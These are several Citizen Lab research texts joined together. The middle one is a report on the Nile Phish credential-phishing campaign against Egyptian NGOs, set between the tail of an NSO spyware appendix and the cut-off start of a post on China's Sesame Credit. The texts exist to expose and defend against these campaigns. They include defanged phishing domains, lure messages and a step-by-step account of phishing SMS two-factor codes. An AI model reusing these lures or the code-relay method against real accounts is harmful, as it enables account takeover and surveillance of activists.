contain links\nIf you get an SMS from a service, like your phone company, visit their website rather than clicking on a link in the message.\n\nIf you believe you have been the victim of targeted spyware, you should consider sharing it with a trusted expert, or a helpline such as that of Access Now.\nCitizen Lab strongly suspects that there may be other targets. If you suspect you have been the target of this particular operation, or have seen very similar text messages (same themes, same URLs, etc)  please contact the Citizen Lab at bittersweet@citizenlab.ca.\nThe Importance of Documentation\nThe discovery that led to the findings in this report is the result of vigilance on the part of Dr. Simon Barquera, Alejandro Calvillo, and Luis Encarnación.  It is also the result of a careful documentation effort by R3D and SocialTIC, and their willingness to share the case with Access Now’s Help Line.  Documentation of suspicious incidents is one of the most important practices civil society groups can adopt to raise awareness of and defenses against these kinds of espionage operations. Documentation can take the form of a simple set of notes with dates, times, and saved messages, or ideally be part of a more complete incident documentation process.\nAcknowledgements\nWe would like to thank our Citizen Lab colleagues Ron Deibert, Irene Poetranto, Adam Senft, Sarah McKune, and Adam Hulcoop.\nAdditional thanks to other researchers, Jen Weedon, and TNG.\nSpecial thanks to R3D and SocialTIC for their assistance with this project. Without their extensive work assembling this case, our report would not have been possible.\nWe thank Access Now, especially their Help Line team, and Amnesty International for assistance compiling evidence, and ensuring that this case came to our attention.\nAppendix A\nMessages containing NSO exploit infrastructure links sent to Dr Simon Barquera, Alejandro Calvillo, and Luis Encarnación\n\n\n\n2016 Date\nTarget\nOriginal\nNSO EXPLOIT FRAMEWORK LINK\n\n\nJuly 8\nAlejandro Calvillo\nAlejandro perdon pero acaba de fallecer mi padre, estamos mal, t envio los datos del velatorio, espero asistas: [malicious link]\nhxxp://bit[.]ly/29xpUI0 \nresolves to: hxxps://smsmensaje[.]mx/9158534s/\n\n\nJuly 11\nDr. Simón Barquera\nPGR ABRE INVESTIGACION A EMPLEADOS DE CLINICA COEM POR NEGLIGENCIA Y ACTOS ILICITOS.

We are preparing a follow-up report, but we believe it is important to note that there is now evidence that the Nile Phish operator has engaged in phishing of 2-factor authentication codes. See: Evidence of 2 Factor Phishing\nKey Findings\n\nEgyptian NGOs are currently being targeted by Nile Phish, a large-scale phishing campaign.\n\n\nAlmost all of the targets we identified are also implicated in Case 173, a sprawling legal case brought by the Egyptian government against NGOs, which has been referred to as an “unprecedented crackdown” on Egypt’s civil society.\n\n\nNile Phish operators demonstrate an intimate knowledge of Egyptian NGOs, and are able to roll out phishing attacks within hours of government actions, such as arrests.\n\n\nSummary\nThis report describes Nile Phish, an ongoing and extensive phishing campaign against Egyptian civil society. In recent years, Egypt has witnessed what is widely described as an “unprecedented crackdown,” on both civil society and dissent. Amidst this backdrop, in late November 2016 Citizen Lab began investigating phishing attempts on staff at the Egyptian Initiative for Personal Rights (EIPR), an Egyptian organization working on research, advocacy and legal engagement to support basic freedoms and rights.  \nWith the collaboration and assistance of EIPR, our investigation expanded to include seven Egyptian NGOs targeted by Nile Phish. These seven organizations work on a variety of human rights issues, including political freedoms, gender issues, and freedom of speech.  We also identified individual targets, including Egyptian lawyers, journalists, and independent activists.\nWith only a handful of exceptions, Nile Phish targets are implicated in Case 173, a legal case brought against NGOs by the Egyptian government over issues of foreign funding. The phishing campaign also coincides with renewed pressure on these organizations and their staff by the Egyptian government, in the context of Case 173, including asset freezes, travel bans, forced closures, and arrests.\nOur collaborative investigation has documented at least 92 messages sent by Nile Phish, many highly personalized, and sent as recently as January 31st, 2017. The phishing campaign has included at least two phases, each with distinct phishing tactics and domains. Efforts seem to have been made to compartmentalize the infrastructure for each phase, but a technical error allowed us to link the servers and conclude that the two phases were part of a single campaign.\nNile Phish’s sponsor clearly has a strong interest in the activities of Egyptian NGOs, specifically those charged by the Egyptian government in Case 173. The Nile Phish operator shows intimate familiarity with the targeted NGOs activities, the concerns of their staff, and an ability to quickly phish on the heels of action by the Egyptian government.  For example, we observed phishing against the colleagues of prominent Egyptian lawyer Azza Soliman, within hours of her arrest in December 2016. The phishing claimed to be a copy of her arrest warrant.\nWe are not in a position in this report to conclusively attribute Nile Phish to a particular sponsor. However, the scale of the campaign and its persistence, within the context of other legal pressures and harassment, compound the extremely difficult situation faced by NGOs in Egypt.\nBackground\nIn recent years, political assembly, freedom of speech, independent media, and civic organizing have been increasingly constrained in Egypt. This concerted effort has been widely called an “unprecedented crackdown” against civil society. One component of this effort has been a rising tide of official and semi-official allegations of foreign interference and foreign funding against Egypt’s civil society organizations. \nIn 2011, the Egyptian Government embarked on a wide-ranging legal case charging that many civil society organizations receive foreign funding, and may be engaged in prohibited or illegal activities.  The case is widely viewed as politically-motivated, and an attempt to frustrate and block the ability of Egyptian civil society to continue its pro-democracy and human rights monitoring work. \nAs part of Case 173, international organizations (e.g.,the National Democratic Institute) and domestic groups (e.g. the Egyptian Initiative for Personal Rights) have been subjected to a wide range of legal sanctions, including arrests, travel bans, asset freezes and harsh sentencing. In 2013, 43 defendants working for international NGOs were sentenced to prison for their work, many in absentia as they had already left the country. \nNow more than 5 years old, Case 173 has been marked by periods of calm, and of intense activity. Initially primarily focused on international NGOs like the National Democratic Institute and the Konrad Adenauer Foundation, the case has grown increasingly focused on domestic Egyptian organizations. The 37 organizations known to be accused in the case include respected civil liberties groups, pro-bono law firms, and organizations working on gender issues.  More recently, beginning in Spring 2016, travel bans and asset freezes were placed on staff members of some domestic organizations under investigation.\nAs a result, many who work for NGOs named in the case are concerned that their ability to travel may be restricted, and that they may face arrest, jail time or other forms of punishment.  Nile Phish, the campaign described in this report, not only targets these individuals, but uses deceptions that play directly into these fears and concerns.\n\nThe Nile Phish Campaign\nIn late 2016, Citizen Lab was contacted by the Egyptian Initiative for Personal Rights (EIPR), whose technical team had observed a growing number of suspicious emails sent to EIPR accounts. The messages had caught the attention of the technical team because multiple messages arrived at the same time, concerned current events, and seemed to play on emotional themes related to Case 173. EIPR’s team helped broaden the investigation to a total of seven targeted Egyptian NGOs.\nAll of the seven Egyptian organizations are also implicated by Case 173. The targets include reputable and respected organizations working on political and rights issues such as freedom of expression, gender rights, and victims of torture and forced disappearances. Six of the organizations have agreed to be named in this report and one requested to be referenced anonymously (see Table 1).\nTable 1: Egyptian NGOs Known to be Targeted by Nile Phish\n\n\n\nTargeted NGO\nWhat they do\n\n\nAssociation for Freedom of Thought and Expression (AFTE)\nLegal aid, strategic litigation, and awareness-raising on issues of freedom of expression in Egypt.\n\n\nCairo Institute for Human Rights Studies (CIHRS)\nA regional NGO that promotes respect for human rights and democracy in the Arab Region.\n\n\nEgyptian Commission for Rights and Freedoms (ECRF)\nEgyptian organization defending human rights and tracking violations. Tracks and campaigns against forced disappearances\n\n\nEgyptian Initiative for Personal Rights (EIPR)\nWorks to strengthen and protect basic rights and freedoms in Egypt through research, advocacy, and litigation. Areas of work include civil liberties, economic and social rights, and criminal justice.\n\n\nNadeem Center for Rehabilitation of Victims of Violence (Nadeem)\nAn anti-torture organization that focuses on assisting victims of torture with rehabilitation, including providing legal services and social support.\n\n\nNazra for Feminist Studies (Nazra)\nPromoting the political participation of women, as well as addressing sexual violence, the organization treats feminism and gender rights as political and social issues.\n\n\nUnnamed NGO\nThis organization has requested that it not be named\n\n\n\nIn addition to the organizations, we identified a small number of individual targets in Egypt, including well-respected lawyers, journalists, and activists.\nWe strongly suspect that there may be other targets, and hope that the Indicators of Targeting that we provide in Appendix A can be used by systems administrators and others to seek evidence of targeting.\nHow The Investigation Began\nThe first Nile Phish message that we examined, sent by Nile Phish to several Egyptian NGOs on November 24, 2016, was made to appear to come from the Nadeem Center for Rehabilitation of Victims of Violence (Nadeem), and invited the NGO staff member to participate in a nonexistent panel discussing Egypt’s draft NGO Act, which was nearing a vote in Parliament. The recipient was invited to visit a link to read more about the panel.\n\nThe operators used language from a real NGO statement that had been circulating, embellishing it with the fake meeting. According to the carefully crafted fiction, the event was co-sponsored by several other NGOs, including EIPR, the Cairo Institute for Human Rights Studies (CIHRS) and Nazra for Feminist Studies (Nazra). These NGOs were signatories of the legitimate statement. Interestingly Nadeem, EIPR, CIHRS, and Nazra were all later targeted by the same phishing campaign.\n\nNov 24 Message Excerpt (Translated)“…The state has already taken real steps to eliminate Egyptian civil society organizations by prosecuting case no. 173/2011 on foreign funding, and several organizations and their current and former directors have been banned from travel and have had their assets frozen. This new law, however, would pave the way for the eradication of any sort of civic action geared to development, charitable activities, and services..\n…Therefore, El Nadeem will organize jointly with political parties and ngos a panel to discuss the status of the civil society organizations in Egypt in the light of the new act beside the restrictions practiced by the security authorities such as travel ban and assesses free, and others restrictive to societal and development work in Egypt.\n[Link to the agenda and to register for the event]\n\nThe link led to a site designed to trick the target into believing that they needed to enter their password to view the file. After confirming that the message was a phishing attack, we began investigation in close collaboration with EIPR’s technical team, which was by then observing a second wave of messages claiming to share a document that listed individuals subject to travel bans. The recipients were the staff of Egyptian civil society organizations, many of whom suspected that they might be included on these lists.\nWe have now documented at least 92 messages from Nile Phish, which we link together by use of the same servers and phishing toolkit.  The majority of the emails were sent to the work accounts of the targets. The messages have targeted at least seven organizations, as well as a number of individual activists, lawyers, and journalists.  Almost all of the targets are staff of organizations that are defendants in Case 173.\n\nThe campaign falls into two phases, which map both onto phishing style, and to different server infrastructure (See: Nile Phish Infrastructure)\n\nWhat is Phishing?\nPhishing is a tactic to steal personal information, like passwords, through deception. Many phishing emails often try to trick you into entering passwords and other secret codes into websites that look legitimate, but are really fake.\nWhile phishing can be used by criminal gangs to steal bank information and for other financial crimes, phishing is also used for espionage and surveillance. For example, the Nile Phish operation seems to be designed to gain access to email accounts and document sharing files belonging to NGOs.\n\n\nPhase 1: Arrest warrants, invitations, and travel ban lists\nLate November- Late December 2016\nIn the first phase of the phishing (approximately November 24-December 26, 2016) a majority of the messages were crafted with references to the ongoing crackdown on civil society, and especially Case 173.  Typically, the messages masqueraded as document shares, primarily via Google or Dropbox, containing highly relevant or sensitive information. \nThe following example of a phishing email that leveraged a recent arrest of a prominent Egyptian lawyer as a lure, illustrates that the phishing was both extremely timely, and conducted by those well aware of the activities of the Egyptian government. Specifically, it suggests that within a few hours of an arrest, the operator of the campaign was using this event as part of their phishing attack.\nAn Arrest Becomes Phishing\nOn December 7, 2016 prominent Egyptian lawyer and the Director of the Center for Women’s Legal Assistance Azza Soliman was arrested at her home. Within hours, while Soliman was still being interrogated at the police station, several of her colleagues in other NGOs received an email purporting to be a Dropbox share of her arrest warrant. (See: Figure 1).   \nFigure 1. Phishing email purporting to share “Arrest Warrant Against Azza Soliman.pdf”\nClicking on the link leads to a Dropbox credential phishing page pre-populated with the target’s username.\nFigure 2: A fake Dropbox login page pre-populated with the identity of the target.\n \nA majority of the Phase 1 messages concerned the court case, and were typically sent to targets’ organizational emails. Where targets were independent activists, we also found targeting of their personal email accounts.\nExample Domains from Phase 1 Phishing\n\n\n\nTheme\nPretext\nSome Targeted NGOs\nExample Domains\n\n\nTrial related\nShare of travel ban list\nEIPR\ndropboxsupport.servehttp[.]com\n\n\nTrial related\nArrest warrant of an activist arrested on the same day\nNadeem\ndropbox-service.serveftp[.]com, googledriver-sign.ddns[.]net\n\n\nTrial related\nPanel invitation to discuss the case\n[unnamed group]\nmailgooglesign.servehttp[.]com\n\n\nTrial related\nNGO letter to the Egyptian President about the case\nCIHRS\ndropbox-sign.servehttp[.]com\n\n\n\nA majority of the messages were sent using Gmail accounts with names that look like legitimate services. This approach does not hold up to close scrutiny of the sender’s email addresses, but also allows the message to be sent via a sender known to Gmail, and thus not flagged by Gmail as sent over an insecure connection.\n\n\n\nMasquerading As\nLookalike Email\n\n\nDropbox\nGmail\n\n\ncustomerserviceonlineteam@gmail.com, dropbox.notfication@gmail.com,dropbox.notifications.mails@gmail.com, dropbox.noreplay@gmail.com\ndrive.noreply.mail@gmail.com,secure.policy.check@gmail.com (Phase 2)\n\n\n\n\nPhase 2: A Tactical Shift\nMid-December – January 31st 2016 (ongoing)\nWhen we began systematically tracking the campaign in late November 2016 almost all of the messages we observed concerned issues related to Case 173, as well as being personalized to the recipient. This approach continued until late December. However, by mid-December, we began observing a growing number of generic phishing messages, mostly emphasizing account security issues.\nHere is an example of such a “generic,” but still personalized message.\nFigure 3: Fake Gmail failed login warning message\nThese messages, while still personalized with users’ names, relied on a range of common phishing tactics, such as warnings of suspicious login attempts, and other account security issues. In a few cases, the operators also included package-delivery notifications. After December 26, we no longer observed any personalized messages. This shift maps onto changes in server infrastructure (see: Nile Phish Infrastructure).\nExample Domains from Phase 2 Phishing\n\n\n\nTheme\nPretext\nSome Targeted NGOs\nExample Domains\n\n\nGmail Phishing\nFailed login, insecure connection,\nEIPR, AFTE, CIHRS, Nazra, ECRF, a prominent journalist\ngoogleverify-signin.servehttp[.]com, googlesignin.servehttp[.]com, security-myaccount.servehttp[.]com\n\n\n\nIt is unclear why Nile Phish operators wound-down their use of Case 173 themes as the campaign went on. It is possible, for example, that they began to suspect that the targets were wary of such messages. It is equally possible that they simply decided to scale back some of their efforts, and rely more heavily on the pre-built examples in the toolkit they used. It is also possible that this represents a fluke either in how the messages were collected, or a pause on the part of the operators.\nThe final possibility is that Nile Phish is a component of a larger operation, and that the operators may intend to continue to use tailored social engineering for other purposes, such as delivering malware.\nArtefacts: Egyptian Chat Slang\nWhile examining the credential landing pages we also found messages and comments that the Nile Phish operators had left for each other. The writing is instantly recognizable as a form of Egyptian Arabic slang (mixing letters and characters) sometimes referred as Araby.\nHighlighted text: “Will remove the cookies from here and point it to our server”\n \nHighlighted text: “Here we will insert the default username page”\n \nHighlighted text: “And here too take care”\n\nNile Phish Using Open-Source Phishing Toolkit\nNile Phish mounted this campaign with gophish, an open-source phishing framework written in the Go language. \nThe gophish framework is intended to be used defensively, as part of anti-phishing trainings.  This is the first offensive use of gophish of which we are aware.  Its developer describes it as “designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training.”  Support for capturing credentials submitted on phishing pages was added to gophish in February 2016.\nThe growing number of open-source and widely available phishing frameworks designed for penetration testing have made it easy to set up a phishing campaign. While some free and hosted phishing frameworks require a degree of authentication onto a particular domain, such as the online Duo Insight, many that are self-hosted do not. The lack of authentication, while minimizing invasiveness and protecting user privacy, is also a double-edged sword, and means that it can be abused to conduct non-consensual and illegal phishing campaigns.\nDiscovery and Identification\nExamination of the phishing infrastructure provided evidence of artefacts from a cloned git  repository, suggesting that this was a likely from a project on Github. This led us to conclude that the operators were likely making use of an existing phishing framework.  Further investigation revealed that the domains were serving the gophish admin page on port 7777, and the scheme of the phishing URLs matched those of gophish.\nFigure 4: Screenshot of gophish admin interface\nGophish links have a common format, which can be used to quickly identify a link sent via the platform.\nGophish link\nhttp://[domain]/?rid=[target identifier string]\nContact with Gophish\nCitizen Lab contacted Jordan Wright, the developer of Gophish and provided examples of the links used in the campaign.  Wright provided us the following response:\n\n“…The links have the same structure as those sent in a Gophish campaign and there are Gophish administrative portals available on those hosts.\nGophish is designed to help administrators test their organization’s exposure to phishing. By running phishing tests against one’s own organization, the hope is that members of the organization will be better at spotting and avoiding phishing emails in the future, mitigating attacks like this.\nThe Gophish team does not condone using the software for any purpose other than running controlled tests to measure your own organization’s exposure to phishing. While we cannot control users and prevent all misuse of the software, we will continue taking any measures possible to prevent this kind of abuse in the future.”\n\n\nNile Phish Infrastructure\nThe campaign’s operators used commercial web hosting located in Europe (Choopa and AlexHost) to host the campaign. They have shown evidence of basic operational security practices, including server compartmentation between Phase 1 and Phase 2.  Nevertheless, in what appears to have been a mistake, one domain resolved to servers from both phases at different times.\nUsing passive DNS analysis tools including PassiveTotal, we were able to further characterize the infrastructure, and how it was used throughout Phase 1 and Phase 2 of the campaign.  We also identified an additional 13 domains through passive DNS research, indicating that the campaign may include a range of other targets not uncovered in our investigation. \nPhase 1 Infrastructure\nUsing passive DNS we found that Phase 1 included at least six domains, all hosted on 108.61.176[.]96.\ngoogledrive-sign.servehttp[.]com\ndropboxsupport.servehttp[.]com\ngoogledriver-sign.ddns[.]net\ndropbox-service.serveftp[.]com\ndropbox-sign.servehttp[.]com\nmailgooglesign.servehttp[.]com\nPhase 2 Infrastructure\nThe second phase of the campaign included at least 16 domains, hosted on IPs 104.238.191[.]204 and 176.123.26[.]42. \nfedex-shipping.servehttp[.]com\nverification-acc.servehttp[.]com\ngoogle-maps.servehttp[.]com\nfedex-mail.servehttp[.]com\nsecure-team.servehttp[.]com\naccount-google.serveftp[.]com\ngoogleverify-signin.servehttp[.]com\ngooglesecure-serv.servehttp[.]com\ngooglesignin.servehttp[.]com\nsecurity-myaccount.servehttp[.]com\nmyaccount.servehttp[.]com\nactivate-google.servehttp[.]com\ngooglemaps.servehttp[.]com\ndevice-activation.servehttp[.]com\naramex-shipping.servehttp[.]com\nfedex-sign.servehttp[.]com\nAdditional Domains\nThrough passive DNS research, we identified 13 additional domains using the same dynamic DNS server and IP addresses.\ndropbox-verfy.servehttp[.]com\nfedex-s.servehttp[.]com\nwatchyoutube.servehttp[.]com\nmoi-gov.serveftp[.]com\nverification-team.servehttp[.]com\nsecurityteam-notify.servehttp[.]com\nsecure-alert.servehttp[.]com\nquota-notification.servehttp[.]com\nnotification-team.servehttp[.]com\nfedex-notification.servehttp[.]com\ndocs-mails.servehttp[.]com\nrestricted-videos.servehttp[.]com\ndropboxnotification.servehttp[.]com\nLinking the Infrastructure\nWhile the operators maintained a degree of compartmentation between domains, we found that the domain fedex-sign.servehttp[.]com resolved to both Phase 1 and Phase 2 infrastructure. \n\n\n\nDomain\nResolution\nUntil\nInfrastructure Belongs to\n\n\nfedex-sign.servehttp[.]com\n108.61.176[.]96\n13 December 2017\nPhase 1\n\n\n104.238.191[.]204\n19 December 2017\nPhase 2\n\n\n\n\nPhishing: The Royal Road to Account Compromise\nReporting on targeted threats often gets attention because of the sophistication of the attackers’ tools, yet by volume many successful attacks use much less advanced technology. The recent case of an iOS zero day used against UAE and Mexican civil society represents a relatively sophisticated and expensive attack vector. While such an operation is costly and relatively difficult to detect, many operations that we have observed at the Citizen Lab use much less sophisticated technical means.\nIn this report we described how the Nile Phish operators used targeted, timely, and clever deceptions combined with an open-source phishing framework. \nWhy Do Many Threat Actors Still Use Credential Phishing?\nWhile we cannot know Nile Phish operators’ reasons for choosing phishing, assuming they have access to other techniques, we can speculate that they used social engineering because it works.  A phishing campaign has a number of advantages, even for operators capable of obtaining expensive and sophisticated malware. Indeed, even in cases where the same operators may also possess and deploy malware. \nAs an exercise, the following table emphasizes some of the advantages of phishing as a technique to gain access to private communications when used by a well resourced actor.  The table highlights some of the reasons why such actors may continue to use phishing.\nCredential Phishing: Why it keeps being used as a surveillance tool\n\n\n\nConcern\nCredential Phishing\n\n\nCost / Skill\nZero or near-zero development cost. Can be deployed with little or no technical skills.\n\n\nScalability \nHigh. Easily deployed against dozens, thousands, or more targets.\n\n\nAdaptability\nHigh. Domains and emails can be quickly modified if a particular approach is not working.\n\n\nRisk of ‘burning’ expensive tools and methods\nLow. Phishing can be conducted using free and open-source toolkits.  Discovery does not result in the compromise of special technical tools, costly exploits, or malware\n\n\nAttribution\nDebateable. Like the use of Commercial-Off-The-Shelf (COTS) malware, phishing does not instantly point to a particular type of actor, such as a government, as many malicious actors use this technique. Discovery of a tool like NSO Group’s Pegasus or Hacking Team’s Remote Control System, on the other hand, strongly implies state involvement, as they are marketed for lawful intercept purposes and the cost of procuring those tools precludes those without significant resources from acquiring them. Moreover, finding phishing may not alert the target that a sophisticated attacker is present.\n\n\nDiverse target environment\nPhishing does not require knowledge of a target’s devices, antivirus, or other endpoint security features. Nor does it require a means to bypass these, such as an exploit, in order to gain access to targeted communications.\n\n\nGathering relevant data\nEmail and online accounts often contain huge troves of data which, when compromised, can quickly be siphoned out of accounts remotely.\n\n\n\nIn using phishing, Nile Phish operators are far from alone.  Citizen Lab reports have repeatedly pointed out that many operators, including those with access to more sophisticated technologies, persist in phishing and other forms of basic social engineering.\nFor example, in South America, the Packrat group, which was active against civil society in several countries, made use of credential phishing as part of its multi-year campaign. Similarly, operations targeting the Tibetan diaspora have also made use of phishing, as have operations targeting the Syrian opposition, Iranian pro-democracy organizations, and many others.\nCheap Ways to Make Phishing NGOs Harder\nCivil society groups make widespread use of cloud email services, file sharing and collaboration tools. These services are exceptionally helpful to organizations that do not have the resources to maintain or secure self-hosted deployments. Many of these cloud services have powerful security features, like 2-factor authentication, that are capable of blunting the impact of straightforward credential phishing.  However, most of these security features are not enabled by default, whether for individual users of cloud services, or for organizations.  The absence of default-on security features predictably leads to a lower rate of use, and keeps the door open for phishing.\n\nWhat is Two Factor Authentication?Two Factor Authentication has many names, like 2 Step Authentication, Login Approvals, 2FA, and so on, but they typically refer to the same thing: combining a password with a second “factor” that only the authorized user has. Most commonly this is a text message sent to the user’s phone. Other versions include physical tokens, code generators, authenticator apps or prompts on devices, and so on.\nClick here for a list of services that support Two Factor Authentication.\n\nFrom the perspective of an NGO however, several approaches are available to increase the cost of phishing, including using more secure forms of 2 Factor Authentication.  As a next-level step, organizations can also implement phishing / social engineering awareness exercises. \nIncrease the Cost to Phish an NGO\n\n\n\nAnti-Phishing Technique\nWorks on\nLimitations\n\n\n2 Factor Authentication with Authenticator Apps or Yubikeys\nAccount security, means that even if credentials are phished a second factor is still required.\n2 Factor Authentication can still be phished in some circumstances, such as tricking victims into entering codes from authenticator apps, although deceptions must be more elaborate.  Does not protect against some malware attacks that steal two factor codes from devices.\n\n\nPhishing Training \nHuman behavior, increasing the likelihood that phishing is noticed.\nCan be time consuming, and requires organizational buy-in. While free tools like Duo Insight are available, other solutions can be expensive.\n\n\n\nUsing Secure 2 Factor Authentication\nThe most common form of 2 Factor authentication is to receive SMS messages. Although a growing number of threat actors are experimenting with phishing 2 Factor credentials, and tampering with SMS-based authentication, including in Egypt, when implemented securely the feature is a low-cost way to dramatically increase the cost-to-phish. \nOne way to increase the security of 2 Factor authentication is to move away from SMS-based authentication to Authenticator Apps or, even more secure, Yubikeys.  Both Google and, most recently Facebook, now support Yubikeys for authentication.\nNext Level: Behavioral Training\nPhishing exploits vulnerabilities that will always be present in human behavior. When a phishing campaign like Nile Phish targets an organization, the operators do not expect that everyone will be duped. One compromise is enough to begin siphoning private data, and to start using that data to construct more convincing phishing or malware attacks against others in an organization.\nThere is a growing consensus that repeated training with mock-phishing exercises, in the form of realistic phishing e-mails sent by the organization’s IT staff, can be an effective way to build an organization’s ‘human firewall.’ There are a number of free tools that NGOs can use to conduct these exercises, including Duo Insight.  Ironically, Gophish is another such tool, although it requires slightly more technical sophistication to implement.  Many other solutions are available, many of them commercial.  While not every organization will be able to implement behavioral training, it is a free and highly effective strategy for reducing institutional exposure to phishing attacks and social engineering.\nWhat Technology Companies Can Do Right Now\nMajor online companies have been reluctant to add 2 Factor Authentication as a default for new account creation. Keeping 2 Factor an opt-in security feature, rather than opt-out means that most users will not enable it. No exact numbers are publicly available about 2 Factor adoption rates, but if it looks like other opt-in choices (e.g. seat belts before being made mandatory), it is unlikely to be adopted by a majority of users.  While there are trade-offs to enabling 2 factor as a default (e.g. costs to account recovery and friction in user experience), reports like this one make it clear that credential phishing will continue to be widely practiced by a range of threat actors against some of the most vulnerable user groups.\n\nConclusion: Nile Phish is yet another threat to Egypt’s Civil Society\nEgyptian NGOs have faced a sprawling legal case that is in its fifth year. The case has resulted in arrests, travel bans, asset freezes, and prison sentences. Almost all of the 92 phishing emails we have identified were sent to individuals implicated in Case 173, either as named defendants, or staff of targeted NGOs.\nWe do not attribute Nile Phish to a sponsor in this report, but it is clear that it is yet another component of the increasingly intense pressure faced by Egyptian civil society. By exposing the Nile Phish operation, including providing more technical indicators, we hope to help potential targets and other investigators identify and mitigate the campaign.\n\nEvidence of 2 Factor Phishing\nSince publication, Citizen Lab and EIPR have been contacted by a number of additional targets. These targets provided us with a range of evidence for additional activities by Nile Phish.  Importantly, it also appears that Nile Phish has engaged in phishing users of 2 factor authentication.  The following illustration describes this process.\nDiagram explaining how Nile Phish operators phish users who have enabled 2 factor authentication. [Click for hi res]The phishing works in this case by tricking the victim into entering both their password and their two factor code. First, the victim is phished by Nile Phish using a deception similar to those described in the report. If the victim is tricked into providing their password, Nile Phish sends the victim a message with a link to a 2-factor code phishing page, then the operators type the stolen password into Gmail. They then request SMS as an Alternative Verification method. Gmail then sends the victim an SMS with a six digit code. If the victim enters the SMS into the code phishing page, the operators use the code to log into gmail to take control of the account.\nAcknowledgements\nVery special thanks to Citizen Lab colleagues including Ron Deibert, Claudio Guarnieri, Sarah McKune, Ned Moran, Masashi Crete-Nishihata, Irene Poetranto, Adam Senft, and Amitpal Singh.\nCitizen Lab also thanks T.

    "text": "\n\t\t\t\tby: Shazeda Ahmed\nKey Findings\n\nThe Chinese government has approved pilot testing of a social credit system that draws upon citizens’ personal data to assign unofficial credit scores, which come with benefits and penalties that private companies and government bureaus manage.\nThe five dimensions of credit score data are “users’ credit history, behavioral habits, ability to pay off debts, personal information, and social networks.”\nThe algorithms that derive the credit scores are trade secrets, prohibiting forms of testing that can determine how they work.\nGovernment blacklists of debtors are being shared with private and public credit scoring services to prohibit individuals from making certain transactions.\n\nThis post, the second in a series on mobile payment systems, examines a Chinese mobile payment app feature increasingly covered in foreign media: testing of what may one day be a nationwide official social credit system to replace its traditional analog counterpart. The most popular publicly available social credit scores are currently being issued through Sesame Credit, a company established by Alibaba subsidiary Ant Financial. Western media reporting on the social credit system describes a science fiction-like phenomenon whereby citizens are assigned scores based on their online behaviour, financial information, and government records. Ant Financial representatives’ disclosures have suggested that late night web browsing, hours spent playing video games, and specific items purchased can all lower one’s score. Whether or not these claims are true, Sesame Credit’s scoring mechanisms are still in an experimental phase and are therefore subject to change. Our exploration of potential security, privacy, and other issues of such a system is meant to raise questions that can inform discussions about how it will evolve.\nAs early as in 2003, the Chinese government expressed interest in creating a comprehensive means of assigning citizens credit scores that would be an improvement over the country’s credit rating system. The State Council recently approved the “Outline of Regulations for Building a Social Credit System (2014-2020)” and at present eight companies have been granted the central bank’s permission to conduct pilot testing of their own social credit systems, akin to the Fair, Isaac and Company (FICO) consumer credit ratings. Part of what makes such an endeavor unique in China is the vagueness and in some cases complete absence of regulations regarding big data collection for credit scoring purposes, potential third party uses of such scores, and privacy protections of the user data that factors into credit score calculations. The new cybersecurity law released on November 7, 2016 contains language regarding privacy protections, yet will not be implemented until June 2017.\nThis article concerns Sesame Credit’s social credit score service, which Alipay users can currently opt into receiving within the app. Sesame Credit’s scores are the most popular example of how a national Chinese social credit system might someday operate, and provides a sense of what considerations Chinese companies, citizens, and the state think should go into such a system. It is one component of a broader Chinese government push to harness big data as a resource for social control. Credit scores are broken down into five dimensions: “users’ credit history, behavioural habits, ability to pay off debts, personal information, and social networks.” Brief descriptions of each of these categories are included within the Sesame Credit feature of Alipay, yet they shed no light on which particular actions would alter one’s score. \nFigure 1: Visualization of a Sesame Credit score within the Alipay app, with each point of the pentagon indicating one of the five dimensions along which social credit scores are allegedly calculated: credit history, behavioural preferences, debt repayment, personal information, and social connections.\n \nAccording to The Paper, “behavioural preferences” refer to actions such as timely bill payment, and “personal information” includes age, sex, occupation, and educational history. More troubling are the ill-defined “concepts of stability” Sesame Credit allegedly takes into consideration, which company representatives have alluded to without clearly defining. These would appear to be highly subjective markers of one’s financial and social standing that contribute to the credit scoring mechanism. The same article from The Paper posits that “if your address changes often, your creditworthiness will correspondingly drop. Additionally, your friends’ credit records will also influence your Sesame Points.” The room for misrepresentation as well as discrimination based on such factors is broad, and the behavior-changing incentives that underlie them are also concerning. Ant Financial’s chief credit data scientist Yu Wujie has said that “If you regularly donate to charity, your credit score will be higher, but it won’t tell you how many payments you need to make every month… but [development] in this direction [is undertaken with] the hope that everyone will donate.” Moreover, Ant Financial’s technology director, Li Yingyun, has stated that “Someone who plays video games for 10 hours a day, for example, would be considered an idle person, and someone who frequently buys diapers would be considered as probably a parent, who on balance is more likely to have a sense of responsibility.” These statements have fueled the condemnatory Western media coverage of social credit thus far, though it should be noted that the only way to know with certainty that the factors company representatives cite can indeed raise or lower scores would be to deconstruct the algorithms that determine them, which have been labeled trade secrets.\nWithout the ability to conduct static or dynamic testing of the social credit algorithms, what can we infer about how they operate? Deng Yiming, the director of Sesame Credit’s business development, has said that only 30 to 40 percent of the data used to generate credit scores comes from Alibaba-owned companies and services. Aside from the data gathered through users’ activity within the Alipay app, Sesame Credit computes individual scores with data collected from Alibaba’s e-commerce websites, ride-sharing apps, and restaurants connected to Alipay, and from government bureaus involving the law, education, and commerce. One of the most clear-cut examples of such a data exchange is Sesame Credit’s tie to the Supreme People’s Court, which has been reported to have shared its blacklist of debtors and others who have violated court verdicts with the company in order to block these people from making so-called luxury purchases in Taobao and Tmall. This arrangement prompts the question of whether Sesame Credit shares data in the opposite direction, possibly providing its partnered government bureaus with users’ transactional information. These collaborations tend to be overshadowed by those in which Sesame Credit works with the private sector to provide benefits to high score holders.\n\nAt present, the privileges of having a high social credit score can include booking a rental car or a hotel room without making a deposit, taking out loans at lower interest rates, being shipped online purchases to try out before paying for them, and obtaining visas to Luxembourg and Singapore through an expedited process. Other countries that have expressed interest in participating in this accelerated visa issuance include Japan, South Korea, Sri Lanka, and the United Kingdom. There has been discussion of future uses of high credit scores extending to matchmaking and job recruitment, which underscores the extent to which biased inputs could create new social barriers. \nChinese government portrayals of the social credit system cast it as a means of reinstating trust between citizens and in local businesses, such as restaurants that will be monitored for compliance with health regulations. Another of the framing arguments for the creation of a social credit system is that it will enable people traditionally unable to accrue credit to be able to do so: students, blue collar workers, small business owners, and the like. Yet so far it appears that the advantages of having a high score (of which it has been speculated that in fact few users have attained) are ones that favor those who are in a better financial position to make lavish and frequent expenditures. One criticism has been that Sesame Credit raises scores for people who conduct more Alipay transactions, which the company has firmly denied. The examples of higher scores for purchases associated with people who are parents and lower scores for people who change home addresses often further suggests that a lack of context can lead to misrepresentations of people’s actions which can carry disproportionate consequences. \nThere is a danger in 